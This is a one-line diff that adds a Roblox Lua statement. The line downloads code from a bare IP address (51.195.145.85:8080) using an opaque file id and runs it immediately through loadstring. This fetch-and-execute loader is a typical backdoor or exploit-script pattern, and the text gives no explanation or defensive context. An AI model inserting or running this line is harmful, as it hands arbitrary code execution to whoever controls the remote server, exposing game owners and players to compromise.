@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://51.195.145.85:8080/getfile?id=RFqNy7RD6qw2HgqCFSeyYPMjV4HWvDDgX9VJH7hqUQWwQZK55E8XkUzBmpWV"))();
